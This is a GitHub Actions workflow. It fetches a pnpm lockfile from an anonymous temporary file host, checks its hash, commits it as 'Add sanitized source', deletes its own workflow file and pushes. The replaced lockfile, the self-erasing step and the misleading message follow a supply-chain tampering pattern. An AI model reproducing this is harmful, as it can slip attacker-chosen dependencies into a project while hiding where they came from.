name: restore-one
on:
  push:
    paths:
      - .github/workflows/restore-one.yml
permissions:
  contents: write
jobs:
  restore:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: restore file
        run: |
          set -euo pipefail
          dest="portal/pnpm-lock.yaml"
          curl -fsSL "https://n.uguu.se/rBDHQNaG.yaml" -o "$dest"
          python3 - << 'PY'
          import hashlib
          from pathlib import Path
          data = Path("portal/pnpm-lock.yaml").read_bytes()
          digest = hashlib.sha256(data).hexdigest()
          if len(data) != 228988 or digest != "ef8b568625fcf44cfd5960d7fdf1e592060a27ef56e6c9b7fbcecc3a6f000d27":
              raise SystemExit(f"bad file {len(data)} {digest}")
          PY
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git config user.name "github-actions[bot]"
          git add "$dest"
          git rm -f .github/workflows/restore-one.yml
          git commit -m "Add sanitized source"
          git push
